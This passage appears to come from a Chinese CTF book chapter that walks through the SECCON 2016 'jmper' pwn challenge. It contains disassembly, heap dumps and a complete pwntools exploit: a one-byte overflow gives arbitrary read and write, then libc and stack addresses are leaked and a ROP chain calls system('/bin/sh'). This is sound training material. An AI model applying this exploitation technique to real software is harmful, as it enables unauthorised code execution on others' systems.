| ||||||: ; JMP XREF from 0x00400ac4 (sym.f)
| |`------> 0x00400acd mov edi, str.Invalid_ID.
; 0x400d64 ; "Invalid ID."
| | ||||: 0x00400ad2 call sym.imp.puts
; int puts(const char *s)
| | ||||: 0x00400ad7 mov edi, 1
| | ||||: 0x00400adc call sym.imp.exit
; void exit(int status)
| | ||||: ; JMP XREF from 0x00400acb (sym.f)
| --------> 0x00400ae1 mov rax, qword [obj.my_class]
; [0x602030:8]=0
| | ||||: 0x00400ae8 mov edx, dword [local_1ch]
| | ||||: 0x00400aeb movsxd rdx, edx
| | ||||: 0x00400aee mov rax, qword [rax + rdx*8]
; 取出 my_class[id]
| | ||||: 0x00400af2 mov rax, qword [rax + 0x28]
; [0x28:8]=-1 ; 取出 my_class[id]->name
| | ||||: 0x00400af6 mov rsi, rax
| | ||||: 0x00400af9 mov edi, 0x400d61
| | ||||: 0x00400afe mov eax, 0
| | ||||: 0x00400b03 call sym.imp.printf
1176
6.1.17 pwn SECCONCTF2016 jmper
; 打印出 my_class[id]->name
| |,====== 0x00400b0d mov eax, dword [local_18h]
| ||||| : 0x00400b10 cmp eax, 5
; 5
| |||||,== 0x00400b5c mov edi, str.Invalid_ID.
; 0x400d64 ; "Invalid ID."
| ||||||: 0x00400b61 call sym.imp.puts
; int puts(const char *s)
| ||||||: 0x00400b66 mov edi, 1
1177
6.1.17 pwn SECCONCTF2016 jmper
| ||||||: 0x00400b6b call sym.imp.exit
; void exit(int status)
| ||||||: ; JMP XREF from 0x00400b5a (sym.f)
| --------> 0x00400b70 mov rax, qword [obj.my_class]
; [0x602030:8]=0
| ||||||: 0x00400b77 mov edx, dword [local_1ch]
| ||||||: 0x00400b7a movsxd rdx, edx
| ||||||: 0x00400b7d mov rax, qword [rax + rdx*8]
; 取出 my_class[id]
| ||||||: 0x00400b81 add rax, 8
; 取出 my_class[id]->memo
| ||||||: 0x00400b85 mov rsi, rax
| ||||||: 0x00400b88 mov edi, 0x400d61
| ||||||: 0x00400b8d mov eax, 0
| ||||||: 0x00400b92 call sym.imp.printf
; 打印出 my_class[id]->memo
| ======== 0x00400b99 mov edi, 0
| ||||| : 0x00400b9e call sym.imp.exit
; void exit(int status)
| ||||| | ; XREFS: JMP 0x00400b97 JMP 0x00400b08 JMP 0x00400
a79 JMP 0x00400a5b JMP 0x004009ae JMP 0x00400990 JMP 0x00400
8e3
\ `````-`= is ~student_num
048 0x00002028 0x00602028 GLOBAL OBJECT 4 student_num
首先注意到这个函数没有 return 指令，要想离开只有两种方法，一个是
exit() ，另一个是 longjmp() 跳回 main 函数，既然这么设置那当然是有用
意的。
通过分析，可以得到 student 结构体和数组 my_class：
1178
6.1.17 pwn SECCONCTF2016 jmper
struct student {
uint8_t id;
char memo[0x20];
char *name;
} student;
struct student *my_class[0x1e];
漏洞就是在读入 memo 和 name 的时候都存在的 one-byte overflow，其中 memo
会覆盖掉 name 指针的低字节。考虑可以将 name 指针改成其它地址，并利用修改
name 的功能修改地址上的内容。
漏洞利用
所以我们的思路是通过 one-byte overflow，使 my_class[0]->name 指向
my_class[1]->name，从而获得任意地址读写的能力。然后泄漏 system 函数地址
和 main 函数的返回地址，将返回地址覆盖以制造 ROP，调用 system('/bin/sh') 获
得 shell。
overflow
def overflow():
add() # idx 0
add() # idx 1
raw_input("#")
write_memo(0, 'A'*0x20 + '\x78')
首先添加两个 student：
1179
6.1.17 pwn SECCONCTF2016 jmper
gdb-peda$ p student_num
$1 = 0x2
gdb-peda$ x/2gx my_class
0x603010: 0x00000000006031e0 0x0000000000603250
gdb-peda$ x/30gx *my_class-0x10
0x6031d0: 0x0000000000000000 0x0000000000000041 name memo
0x6031f0: 0x0000000000000000 0x0000000000000000
0x603200: 0x0000000000000000 0x0000000000603220
name
0x603210: 0x0000000000000000 0x0000000000000031 name memo
0x603260: 0x0000000000000000 0x0000000000000000
0x603270: 0x0000000000000000 0x0000000000603290
name
0x603280: 0x0000000000000000 0x0000000000000031 memo 的溢出修改 my_class[0]->name，使其指向
my_class[1]->name：
1180
6.1.17 pwn SECCONCTF2016 jmper
gdb-peda$ x/30gx *my_class-0x10
0x6031d0: 0x0000000000000000 0x0000000000000041
0x6031e0: 0x0000000000000000 0x4141414141414141
0x6031f0: 0x4141414141414141 0x4141414141414141
0x603200: 0x4141414141414141 0x0000000000603278
name
0x603210: 0x0000000000000000 0x0000000000000031
0x603220: 0x0000000000000000 0x0000000000000000
0x603230: 0x0000000000000000 0x0000000000000000
0x603240: 0x0000000000000000 0x0000000000000041
0x603250: 0x0000000000000001 0x0000000000000000
0x603260: 0x0000000000000000 0x0000000000000000
0x603270: 0x0000000000000000 0x0000000000603290
name
0x603280: 0x0000000000000000 0x0000000000000031
0x603290: 0x0000000000000000 0x0000000000000000
0x6032a0: 0x0000000000000000 0x0000000000000000
0x6032b0: 0x0000000000000000 0x0000000000020d51
通过 overflow，我们控制了 my_class[1]->name，可以对任意地址（除了GOT表）
读或写。
leak
然后我们可以修改 my_class[1]->name 为 libc 中任意符号的地址，从而泄漏出需要
的地址信息：
1181
6.1.17 pwn SECCONCTF2016 jmper
def leak():
global system_addr
global main_ret_addr
write_name(0, p64(elf.got['puts']))
show_name(1)
puts_addr = (u64(io.recvline()[:6] + '\x00'*2))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
environ_addr = libc_base + libc.symbols['environ']
write_name(0, p64(environ_addr))
show_name(1)
stack_addr = u64(io.recvline()[:6] + '\x00'*2)
main_ret_addr = stack_addr - 0xf0
log.info("libc base: 0x%x" % libc_base)
log.info("system address: 0x%x" % system_addr)
log.info("main return address: 0x%x" % main_ret_addr)
于是我们就得到了 system 函数的地址和 main 函数的返回地址。
这里我们利用了 libc 中的 environ 符号，该符号执行一个栈上的地址，通过计算偏
移即可得到返回地址。
[*] libc base: 0x7ffff7a15000
[*] system address: 0x7ffff7a5b590
[*] main return address: 0x7fffffffed78
overwrite
1182
6.1.17 pwn SECCONCTF2016 jmper
def overwrite():
write_name(0, p64(0x602028)) # student_num
write_name(1, '/bin/sh\x00')
write_name(0, p64(main_ret_addr))
write_name(1, p64(pop_rdi_ret) + p64(0x602028) + p64(system_
addr)) # system('/bin/sh')
接下来我们将 student_num 改为 '/bin/sh'，这样一方面为 system 提供了参数，另
一方面可以触发 longjmp。
gdb-peda$ x/s 0x602028
0x602028 : "/bin/sh"
gdb-peda$ x/3gx 0x7fffffffed78
0x7fffffffed78: 0x0000000000400cc3 0x0000000000602028
0x7fffffffed88: 0x00007ffff7a5b590
pwn
def pwn():
add() # call longjmp to back to main
io.interactive()
Bingo!!!
$ python exp.py
[+] Starting local process './jmper': pid 3935
[*] Switching to interactive mode
Exception has occurred. Jump!
Nice jump! Bye :)
$ whoami
firmy
exploit
完整的 exp 如下：
1183
6.1.17 pwn SECCONCTF2016 jmper
#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
io = process(['./jmper'], env={'LD_PRELOAD':'./libc-2.19.so'})
elf = ELF('jmper')
libc = ELF('libc-2.19.so')
pop_rdi_ret = 0x400cc3
def add():
io.sendlineafter("Bye :)\n", '1')
def write_name(idx, content):
io.sendlineafter("Bye :)\n", '2')
io.sendlineafter("ID:", str(idx))
io.sendlineafter("name:", content)
def write_memo(idx, content):
io.sendlineafter("Bye :)\n", '3')
io.sendlineafter("ID:", str(idx))
io.sendlineafter("memo:", content)
def show_name(idx):
io.sendlineafter("Bye :)\n", '4')
io.sendlineafter("ID:", str(idx))
def show_memo(idx):
io.sendlineafter("Bye :)\n", '5')
io.sendlineafter("ID:", str(idx))
def overflow():
add() # idx 0
add() # idx 1
write_memo(0, 'A'*0x20 + '\x78')
def leak():
1184
6.1.17 pwn SECCONCTF2016 jmper
global system_addr
global main_ret_addr
write_name(0, p64(elf.got['puts']))
show_name(1)
puts_addr = (u64(io.recvline()[:6] + '\x00'*2))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
environ_addr = libc_base + libc.symbols['environ']
write_name(0, p64(environ_addr))
show_name(1)
stack_addr = u64(io.recvline()[:6] + '\x00'*2)
main_ret_addr = stack_addr - 0xf0
log.info("libc base: 0x%x" % libc_base)
log.info("system address: 0x%x" % system_addr)
log.info("main return address: 0x%x" % main_ret_addr)
def overwrite():
write_name(0, p64(0x602028)) # student_num
write_name(1, '/bin/sh\x00')
write_name(0, p64(main_ret_addr))
write_name(1, p64(pop_rdi_ret) + p64(0x602028) + p64(system_
addr)) # system('/bin/sh')
def pwn():
add() # call longjmp to back to main
io.interactive()
if __name__ == "__main__":
overflow()
leak()